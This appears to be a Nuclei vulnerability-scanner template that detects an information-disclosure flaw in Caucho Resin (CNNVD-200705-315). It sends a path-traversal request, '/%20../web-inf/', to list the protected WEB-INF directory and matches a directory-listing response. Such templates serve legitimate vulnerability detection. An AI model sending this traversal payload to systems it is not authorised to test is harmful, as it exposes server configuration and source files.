id: resin-cnnvd-200705-315

info:
  name: Caucho Resin Information Disclosure
  author: princechaddha
  severity: high
  description: Sensitive info disclosed in Caucho Resin.
  reference:
    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-200705-315
  metadata:
    max-request: 1
  tags: resin,caucho,lfr,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/%20../web-inf/"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "/ ../web-inf/"
          - "Directory of /"
        condition: and
        part: body
